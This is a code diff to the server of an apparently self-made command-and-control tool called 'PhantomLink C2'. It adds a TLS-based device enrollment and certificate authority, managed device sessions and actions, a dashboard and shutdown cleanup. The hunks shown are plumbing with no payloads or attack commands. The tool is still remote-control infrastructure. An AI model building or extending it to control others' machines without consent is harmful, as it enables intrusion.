@@ -11,23 +11,81 @@ import requests
 from notifypy import Notify
 import http.server
 import json
+from dataclasses import dataclass, field
+from pathlib import Path
 from urllib.parse import urlparse, parse_qs
 import sys
-sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
-from config import DISCORD_WEBHOOK, SERVER_IP, API_KEY as _CONFIG_API_KEY, CLIENT_PASSWORD
+_PROJECT_ROOT = str(Path(__file__).resolve().parent.parent)
+_SCRIPT_DIRECTORY = Path(__file__).resolve().parent
+if __package__ in (None, ""):
+    sys.path[:] = [
+        entry
+        for entry in sys.path
+        if Path(entry or os.getcwd()).resolve() != _SCRIPT_DIRECTORY
+    ]
+sys.path.insert(0, _PROJECT_ROOT)
+from config import (
+    API_KEY as _CONFIG_API_KEY,
+    CLIENT_PASSWORD,
+    DISCORD_WEBHOOK,
+    ENROLLMENT_PORT,
+    MANAGED_CA_CERT,
+    MANAGED_CA_KEY,
+    MANAGED_DB,
+    MANAGED_PORT,
+    MANAGED_HOST,
+    MANAGED_STORE,
+    MANAGED_TLS_CERT,
+    MANAGED_TLS_KEY,
+    SERVER_IP,
+    managed_phase2_configured,
+    managed_phase2_enabled,
+)
 
 try:
     from .commands import CmdContext, command_registry  # package mode (tests)
     from .auth import check_api_key, check_client_password
     from .protocol import decode_message, encode_message, recv_exactly
-    from .crypto import derive_key, encrypt, decrypt
+    from .crypto import decrypt, derive_key, encrypt
     from .console import console as _console  # package mode (tests)
+    from .managed_auth import (
+        EnrollmentServer,
+        EnrollmentService,
+    )
+    from .dashboard import start_dashboard
+    from .managed_dashboard import ManagedDashboardData
+    from .managed_pki import ControllerCertificateAuthority
+    from .managed_registry import ManagedRegistry, backup_phase1_stores
+    from .managed_services import (
+        DeviceActionService,
+        DeviceQueryService,
+        ManagedServer,
+        SessionManager,
+        validate_managed_bind,
+    )
 except ImportError:  # script mode (python C2/C2.py)
-    from commands import CmdContext, command_registry
-    from auth import check_api_key, check_client_password
-    from protocol import decode_message, encode_message, recv_exactly
-    from crypto import derive_key, encrypt, decrypt
-    from console import console as _console
+    if __package__ not in (None, ""):
+        raise
+    from C2.commands import CmdContext, command_registry
+    from C2.auth import check_api_key, check_client_password
+    from C2.protocol import decode_message, encode_message, recv_exactly
+    from C2.crypto import decrypt, derive_key, encrypt
+    from C2.console import console as _console
+    from C2.managed_auth import (
+        EnrollmentServer,
+        EnrollmentService,
+    )
+    from C2.dashboard import start_dashboard
+    from C2.managed_dashboard import ManagedDashboardData
+    from C2.managed_pki import ControllerCertificateAuthority
+    from C2.managed_registry import ManagedRegistry, backup_phase1_stores
+    from C2.managed_services import (
+        DeviceActionService,
+        DeviceQueryService,
+        ManagedServer,
+        SessionManager,
+        validate_managed_bind,
+    )
 
 version = 11.7 #7/3/2026
 
@@ -289,7 +347,9 @@ class ClientManager:
     def _send_message(self, conn, data):
         """Send data with length prefix (payload encrypted)"""
         try:
-            length_packet, payload = encode_message(encrypt(derive_key(CLIENT_PASSWORD), data))
+            length_packet, payload = encode_message(
+                encrypt(derive_key(CLIENT_PASSWORD), data)
+            )
             conn.sendall(length_packet)
             conn.sendall(payload)
             return True
@@ -854,27 +914,227 @@ def interact_with_client(client_manager, client_id):
     return 'continue'
 
 
+@dataclass
+class _ManagedRuntime:
+    registry: object
+    authority: object
+    sessions: object
+    query_service: object
+    action_service: object
+    dashboard_data: object
+    managed_server: object
+    enrollment_server: object
+    stop_event: threading.Event
+    managed_thread: threading.Thread | None = None
+    enrollment_thread: threading.Thread | None = None
+    _cleanup_lock: threading.Lock = field(default_factory=threading.Lock, repr=False)
+    _cleanup_complete: bool = False
+
+
+def _build_managed_runtime() -> _ManagedRuntime:
+    host = validate_managed_bind(MANAGED_HOST)
+    store = Path(MANAGED_STORE)
+    backup_phase1_stores(store, store / "phase1-backup")
+    registry = ManagedRegistry(Path(MANAGED_DB))
+    registry.initialize()
+    authority = ControllerCertificateAuthority(
+        Path(MANAGED_CA_KEY), Path(MANAGED_CA_CERT)
+    )
+    authority._load_ca()
+    sessions = SessionManager(registry)
+    query_service = DeviceQueryService(registry, sessions)
+    action_service = DeviceActionService(registry, sessions)
+    managed_server = None
+    enrollment_server = None
+    try:
+        managed_server = ManagedServer(
+            host,
+            MANAGED_PORT,
+            Path(MANAGED_TLS_CERT),
+            Path(MANAGED_TLS_KEY),
+            Path(MANAGED_CA_CERT),
+            registry,
+            sessions,
+        )
+        enrollment_service = EnrollmentService(registry, authority)
+        enrollment_server = EnrollmentServer(
+            host,
+            ENROLLMENT_PORT,
+            Path(MANAGED_TLS_CERT),
+            Path(MANAGED_TLS_KEY),
+            enrollment_service,
+        )
+        dashboard_data = ManagedDashboardData(query_service, action_service)
+    except Exception as error:
+        if enrollment_server is not None:
+            try:
+                enrollment_server.server_close()
+            except Exception as cleanup_error:
+                if hasattr(error, "add_note"):
+                    error.add_note(f"enrollment rollback failed: {cleanup_error}")
+        if managed_server is not None:
+            try:
+                managed_server.stop(timeout=5)
+            except Exception as cleanup_error:
+                if hasattr(error, "add_note"):
+                    error.add_note(f"managed rollback failed: {cleanup_error}")
+        raise
+    return _ManagedRuntime(
+        registry,
+        authority,
+        sessions,
+        query_service,
+        action_service,
+        dashboard_data,
+        managed_server,
+        enrollment_server,
+        threading.Event(),
+    )
+
+
+def _start_managed_runtime(runtime: _ManagedRuntime) -> None:
+    runtime.managed_thread = runtime.managed_server.start(runtime.stop_event)
+    runtime.enrollment_thread = threading.Thread(
+        target=runtime.enrollment_server.serve_forever,
+        name="enrollment-listener",
+        daemon=False,
+    )
+    runtime.enrollment_thread.start()
+
+
+def _stop_managed_runtime(runtime: _ManagedRuntime) -> list[str]:
+    cleanup_lock = runtime._cleanup_lock if isinstance(runtime, _ManagedRuntime) else None
+    if cleanup_lock is not None:
+        cleanup_lock.acquire()
+        if runtime._cleanup_complete:
+            cleanup_lock.release()
+            return []
+    errors = []
+    shutdown_thread = None
+    try:
+        enrollment_running = (
+            runtime.enrollment_server is not None
+            and runtime.enrollment_thread is not None
+            and runtime.enrollment_thread.ident is not None
+            and runtime.enrollment_thread.is_alive()
+        )
+        if enrollment_running:
+            shutdown_errors = []
+
+            def shutdown_enrollment():
+                try:
+                    runtime.enrollment_server.shutdown()
+                except Exception as error:
+                    shutdown_errors.append(error)
+
+            shutdown_thread = threading.Thread(
+                target=shutdown_enrollment,
+                name="enrollment-shutdown",
+                daemon=True,
+            )
+            shutdown_thread.start()
+            shutdown_thread.join(timeout=5)
+            if shutdown_thread.is_alive():
+                errors.append("enrollment shutdown timed out")
+            elif shutdown_errors:
+                errors.append(f"enrollment shutdown: {shutdown_errors[0]}")
+        if runtime.enrollment_server is not None:
+            try:
+                runtime.enrollment_server.stop_accepting()
+            except Exception as error:
+                errors.append(f"enrollment stop accepting: {error}")
+        if shutdown_thread is not None and shutdown_thread.is_alive():
+            shutdown_thread.join(timeout=5)
+        runtime.stop_event.set()
+        try:
+            runtime.managed_server.stop(timeout=5)
+        except Exception as error:
+            errors.append(f"managed stop: {error}")
+        current_thread = threading.current_thread()
+        for thread in (runtime.enrollment_thread, runtime.managed_thread):
+            if thread is not None and thread.ident is not None and thread is not current_thread:
+                try:
+                    thread.join(timeout=5)
+                    if thread.is_alive():
+                        errors.append(f"{thread.name} join timed out")
+                except Exception as error:
+                    errors.append(f"{thread.name} join: {error}")
+        return errors
+    finally:
+        if cleanup_lock is not None:
+            runtime._cleanup_complete = True
+            cleanup_lock.release()
+
+
 def main():
     client_manager = ClientManager()
+    managed_runtime = None
+    dashboard_thread = None
+    dashboard_stop_event = threading.Event()
+    services_cleaned = False
 
-    try:
-        from dashboard import start_dashboard
+    def cleanup_managed_services():
+        nonlocal services_cleaned
+        if services_cleaned:
+            return []
+        services_cleaned = True
+        errors = []
+        if managed_runtime is not None:
+            errors.extend(_stop_managed_runtime(managed_runtime))
+        dashboard_stop_event.set()
+        if (
+            dashboard_thread is not None
+            and dashboard_thread.ident is not None
+            and dashboard_thread is not threading.current_thread()
+        ):
+            try:
+                dashboard_thread.join(timeout=5)
+            except Exception as error:
+                errors.append(f"dashboard join: {error}")
+        return errors
 
-        dashboard_thread = threading.Thread(
-            target=start_dashboard,
-            args=(client_manager, 7000),
-            daemon=True
-        )
-        dashboard_thread.start()
+    if managed_phase2_enabled():
+        try:
+            managed_runtime = _build_managed_runtime()
+        except Exception:
+            print("[!] Managed Phase 2 startup failed; managed listeners not started")
+    elif managed_phase2_configured():
+        print("[!] Managed Phase 2 configuration incomplete; managed listeners not started")
+    else:
+        print("Managed services disabled")
 
-        time.sleep(2)
+    managed_start_failed = False
+    if managed_runtime is not None:
+        try:
+            _start_managed_runtime(managed_runtime)
+            print(
+                f"[+] Managed TLS on {MANAGED_HOST}:{MANAGED_PORT}; "
+                f"enrollment HTTPS on {MANAGED_HOST}:{ENROLLMENT_PORT}"
+            )
+        except Exception:
+            managed_start_failed = True
+            for cleanup_error in cleanup_managed_services():
+                print(f"[!] Managed services cleanup error: {cleanup_error}")
+            print("[!] Managed Phase 2 startup failed; managed listeners not started")
 
-    except (ImportError, ModuleNotFoundError):
-        print("[*] Dashboard module not present. Continuing without dashboard...")
-    except Exception as e:
-        print(f"[!] Dashboard error: {e}")
-        print("[*] Continuing without dashboard...")
-
+    if not managed_start_failed:
+        try:
+            dashboard_thread = threading.Thread(
+                target=start_dashboard,
+                args=(
+                    client_manager,
+                    7000,
+                    2.0,
+                    "PhantomLink C2 - Live Dashboard",
+                    managed_runtime.dashboard_data if managed_runtime is not None else None,
+                    dashboard_stop_event,
+                ),
+                daemon=True,
+            )
+            dashboard_thread.start()
+            time.sleep(2)
+        except Exception:
+            print("[!] Dashboard failed to start; managed services remain active")
 
     # Start API server
     try:
@@ -897,6 +1157,8 @@ def main():
         s.listen(10)
     except Exception as e:
         print(f"[!] Failed to setup server: {e}")
+        for cleanup_error in cleanup_managed_services():
+            print(f"[!] Managed services cleanup error: {cleanup_error}")
         return
 
     print(f"\n[+] Listening on {HOST}:{PORT}")
@@ -1275,6 +1537,8 @@ def main():
     finally:
         # Cleanup
         print("[+] Cleaning up...")
+        for cleanup_error in cleanup_managed_services():
+            print(f"[!] Managed services cleanup error: {cleanup_error}")
         try:
             s.close()
         except Exception:
